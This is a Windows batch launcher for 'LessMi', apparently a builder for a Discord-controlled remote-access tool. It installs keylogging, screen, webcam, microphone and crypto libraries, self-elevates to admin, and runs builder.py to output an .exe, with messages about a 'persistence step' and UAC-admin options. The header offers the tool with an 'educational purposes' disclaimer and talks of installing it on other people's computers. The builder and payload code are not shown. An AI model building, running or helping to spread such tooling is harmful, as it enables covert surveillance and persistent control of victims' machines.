::  __  __       _          _    ____ 
:: |  \/  | __ _| |_ ___   / \  / ___|
:: | |\/| |/ _` | __/ _ \ / _ \| |  _ 
:: | |  | | (_| | ||  __// ___ \ |_| |
:: |_|  |_|\__,_|\__\___/_/   \_\____|
::
:: © Copyright 2026 - MateAG
:: All rights reserved. Any copy without 
:: consent of this code will be reported.
::
:: ℹ > This project is only for educational purposes.
:: The creator is NOT responsible of any illegal/malicious use
:: of this project.
::
:: The creator advices you to use this for testing and
:: legal activities. If you want to install this on
:: someone else computer, please ask them for the
:: permission to.
::
:: Thank you and happy testing! <3

@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
set "SELF=%~f0"
set "LOG=%TEMP%\lessmi-launcher.log"
set "PKGCOUNT=27"

if "%~1"=="__go" goto :main

set "VT=0"
for /f "tokens=3" %%v in ('reg query "HKCU\Console" /v VirtualTerminalLevel 2^>nul ^| find /i "VirtualTerminalLevel"') do set "VT=%%v"
set "NEEDVT=0"
if /i not "%VT%"=="0x1" (
    reg add "HKCU\Console" /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul 2>&1
    set "NEEDVT=1"
)
net session >nul 2>&1
if not errorlevel 1 goto :relaunch
powershell -NoProfile -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/k \"\"%SELF%\" __go\"' -Verb RunAs"
exit /b
:relaunch
if "%NEEDVT%"=="1" (
    start "LessMi" cmd /k ""%SELF%" __go"
    exit /b
)
goto :main

:main
cd /d "%~dp0"
mode con: cols=104 lines=40 >nul 2>&1
title LessMi Launcher
> "%LOG%" echo.

for /f %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"
for /f %%b in ('echo prompt $h ^| cmd') do set "BS=%%b"

set "RST=%ESC%[0m"
set "BD=%ESC%[1m"
set "D=%ESC%[90m"
set "W=%ESC%[97m"
set "G=%ESC%[92m"
set "Y=%ESC%[93m"
set "C=%ESC%[96m"
set "B=%ESC%[94m"
set "M=%ESC%[95m"
set "RD=%ESC%[91m"

set "CLR="
for /l %%i in (1,1,80) do set "CLR=!CLR!%BS%"
set "RULE="
for /l %%i in (1,1,94) do set "RULE=!RULE!─"

echo %ESC%[?25l
call :banner
call :header

:menu
echo.
echo   %D%▌%RST% %D%[%RST%%C%1%RST%%D%]%RST%   %W%Automatic installation%RST%   %D%· Recommended for first time users.%RST%
echo   %D%▌%RST% %D%[%RST%%C%2%RST%%D%]%RST%   %W%Install dependencies%RST%   %D%· Installs every required module.%RST%
echo   %D%▌%RST% %D%[%RST%%C%3%RST%%D%]%RST%   %W%Run builder%RST%   %D%· Only if dependencies are already installed.%RST%
echo   %D%▌%RST% %D%[%RST%%C%4%RST%%D%]%RST%   %W%Doctor%RST%   %D%· Checks your environment.%RST%
echo   %D%▌%RST% %D%[%RST%%C%5%RST%%D%]%RST%   %W%Clean%RST%   %D%· Wipes dist, build and caches.%RST%
echo   %D%▌%RST% %D%[%RST%%C%6%RST%%D%]%RST%   %W%Exit%RST%   %D%· Closes this console.%RST%
echo.
choice /c 123456 /n /m "  %BD%%C%>%RST% %D%Select an option%RST% "
if errorlevel 6 goto :quit
if errorlevel 5 goto :clean
if errorlevel 4 goto :doctor
if errorlevel 3 goto :builder
if errorlevel 2 goto :deps
if errorlevel 1 goto :auto

:auto
call :section "Automatic installation"
call :deps_body
echo.
if defined FAILED (
    call :warn "Some modules failed, the build may break"
    choice /c yn /n /t 6 /d y /m "  %D%Continue to build anyway? [y/n]%RST% "
    if errorlevel 2 goto :menu
)
call :builder_body
call :pause_key
goto :menu

:deps
call :section "Dependencies"
call :deps_body
call :pause_key
goto :menu

:deps_body
set "FAILED="
set "TOTAL=0"
set "OKC=0"
set "FAILC=0"
where python >nul 2>&1
if errorlevel 1 (
    call :err "Python is not in PATH, aborting"
    set "FAILED=python"
    exit /b
)
for /f "tokens=2" %%v in ('python -V 2^>^&1') do call :info "Interpreter: Python %%v"
call :info "Refreshing pip"
python -m pip install --upgrade pip --disable-pip-version-check -q >>"%LOG%" 2>&1
if errorlevel 1 (call :warn "Pip self-upgrade failed, continuing") else (call :ok "Pip ready")

call :pkg "discord.py[voice]"
call :pkg "discord.py"
call :pkg "PyNaCl"
call :pkg "aiohttp"
call :pkg "aiosqlite"
call :pkg "requests"
call :pkg "pyinstaller==6.22.3"
call :pkg "customtkinter"
call :pkg "pillow"
call :pkg "opencv-python"
call :pkg "numpy"
call :pkg "imageio"
call :pkg "audioop-lts"
call :pkg "imageio-ffmpeg"
call :pkg "sounddevice"
call :pkg "pynput"
call :pkg "pyautogui"
call :pkg "pycryptodomex"
call :pkg "plyer"
call :pkg "pygame-ce>=2.5.5"
call :pkg "psutil"
call :pkg "pywin32"
call :pkg "comtypes"
call :pkg "pycaw"
call :pkg "pygrabber"
call :pkg "pycryptodome"
call :pkg "certifi"

echo.
if defined FAILED (
    call :err "%FAILC% of %TOTAL% failed"
    call :warn "Log: %LOG%"
) else (
    call :ok "All %TOTAL% modules installed"
)
if defined WT_SESSION (call :info "Windows Terminal kept alive") else (taskkill /f /im WindowsTerminal.exe >nul 2>&1)
exit /b

:pkg
set /a TOTAL+=1
<nul set /p "=  %D%[ .. ]%RST% %~1  "
python -m pip install "%~1" --disable-pip-version-check -q --no-input >>"%LOG%" 2>&1
if errorlevel 1 (
    set /a FAILC+=1
    set "FAILED=%FAILED% %~1"
    <nul set /p "=%CLR%  %RD%[FAIL]%RST% %~1  "
) else (
    set /a OKC+=1
    <nul set /p "=%CLR%  %G%[ OK ]%RST% %~1  "
)
>>"%LOG%" echo [pip] %~1
call :bar %TOTAL% %PKGCOUNT%
echo.
exit /b

:bar
setlocal enabledelayedexpansion
set /a "_f=(%1*22)/%2"
set "_s="
for /l %%i in (1,1,22) do (
    if %%i LEQ !_f! (set "_s=!_s!#") else (set "_s=!_s!-")
)
<nul set /p "=%D%[!_s!]%RST% %W%%1%RST%%D%/ %2%RST%"
endlocal
exit /b

:builder
call :section "Build"
call :builder_body
call :pause_key
goto :menu

:builder_body
if not exist "builder.py" (
    call :err "builder.py missing"
    exit /b
)
if not exist "source_assembled.py" (call :warn "source_assembled.py missing")
if not exist "custom_imports.txt" (call :warn "custom_imports.txt missing, no --uac-admin or extra args")
net session >nul 2>&1
if errorlevel 1 (call :warn "Not elevated, persistence step will be skipped") else (call :ok "Elevated")

del /f /q dist\*.py dist\*.spec dist\*.txt dist\*.ico dist\*.mp4 dist\*.png >nul 2>&1
call :info "Launching builder.py"
python builder.py
if errorlevel 1 (set "RC=1") else (set "RC=0")
del /f /q dist\*.py dist\*.spec dist\*.txt dist\*.ico dist\*.mp4 dist\*.png >nul 2>&1
if "%RC%"=="0" (call :ok "Builder exited cleanly") else (call :err "Builder exited with code %RC%")

set "NEWEXE="
for /f "delims=" %%f in ('dir /b /o-d "dist\*.exe" 2^>nul') do if not defined NEWEXE set "NEWEXE=%%f"
if defined NEWEXE (
    for %%f in ("dist\%NEWEXE%") do call :ok "Artifact: %%~nxf  %%~zf bytes"
    call :info "Artifact path: dist\%NEWEXE%"
) else (
    call :warn "No .exe produced in dist"
)
exit /b

:doctor
call :section "Doctor"
net session >nul 2>&1
if errorlevel 1 (call :warn "Not elevated") else (call :ok "Elevated")
where python >nul 2>&1
if errorlevel 1 (call :err "Python missing from PATH") else (call :ok "Python present")
for %%f in (builder.py source_assembled.py custom_imports.txt requirements.txt) do (
    if exist "%%f" (call :ok "%%f") else (call :err "%%f missing")
)
if exist "resources" (call :ok "resources folder") else (call :err "resources folder missing")
python -c "import PyInstaller;print(PyInstaller.__version__)" >nul 2>&1
if errorlevel 1 (call :err "PyInstaller not importable") else (call :ok "PyInstaller importable")
python -c "import customtkinter" >nul 2>&1
if errorlevel 1 (call :err "customtkinter not importable") else (call :ok "customtkinter importable")
python -c "import win32com.client,win32security" >nul 2>&1
if errorlevel 1 (call :err "pywin32 partial, tasks will fail") else (call :ok "pywin32 usable")
call :info "Log: %LOG%"
call :pause_key
goto :menu

:clean
call :section "Clean up"
echo   %Y%This removes dist, build, __pycache__ and the pip cache.%RST%
choice /c yn /n /t 8 /d y /m "  %D%Continue? [y/n]%RST% "
if errorlevel 2 goto :menu
for %%d in (dist build __pycache__) do (
    if exist "%%d" (
        rd /s /q "%%d" >nul 2>&1
        call :ok "Removed %%d"
    )
)
python -m pip cache purge >nul 2>&1
call :ok "Pip cache purged"
call :pause_key
goto :menu

:quit
echo.
call :type "Closing console"
echo %ESC%[?25h
timeout /t 1 >nul
exit /b

:banner
echo.
echo   %M%██╗     ███████╗███████╗███████╗███╗   ███╗██╗%RST%
echo   %M%██║     ██╔════╝██╔════╝██╔════╝████╗ ████║██║%RST%
echo   %B%██║     █████╗  ███████╗███████╗██╔████╔██║██║%RST%
echo   %C%██║     ██╔══╝  ╚════██║╚════██║██║ ╚═╝ ██║██║%RST%
echo   %C%███████╗███████╗███████║███████║██║     ██║██║%RST%
echo   %W%╚══════╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝%RST%
echo.
call :type "  > Star the project or open an issue if you find a bug."
call :type "  > This project is for educational purposes only."
call :type "  > The creator is not responsible for any misuse."
echo.
exit /b

:header
echo %D%%RULE%%RST%
net session >nul 2>&1
if errorlevel 1 (
    echo   %D%Admin%RST% %RD%no%RST%    %D%Python%RST% %W%!PYVER!%RST%    %D%Directory%RST% %W%%CD%%RST%
) else (
    echo   %D%Admin%RST% %G%yes%RST%   %D%Python%RST% %W%!PYVER!%RST%    %D%Directory%RST% %W%%CD%%RST%
)
for /f "tokens=2" %%v in ('python -V 2^>^&1') do set "PYVER=%%v"
echo %D%%RULE%%RST%
exit /b

:section
echo.
echo %D%%RULE%%RST%
echo   %M%▌%RST% %BD%%W%%~1%RST%
echo %D%%RULE%%RST%
echo.
exit /b

:ok
echo   %G%[ OK ]%RST% %~1
>>"%LOG%" echo [OK] %~1
exit /b

:info
echo   %C%[ .. ]%RST% %~1
>>"%LOG%" echo [..] %~1
exit /b

:warn
echo   %Y%[WARN]%RST% %~1
>>"%LOG%" echo [WARN] %~1
exit /b

:err
echo   %RD%[FAIL]%RST% %~1
>>"%LOG%" echo [FAIL] %~1
exit /b

:pause_key
echo.
echo   %D%Press any key to return to the menu%RST%
pause >nul
exit /b

:type
setlocal enabledelayedexpansion
set "S=%~1"
:type_loop
if not defined S goto :type_done
set "CH=!S:~0,1!"
set "S=!S:~1!"
<nul set /p "=%W%!CH!%RST%"
call :wait 11
goto :type_loop
:type_done
echo.
endlocal
exit /b

:wait
set /a "_w=%1*5200"
for /l %%i in (1,1,%_w%) do rem
exit /b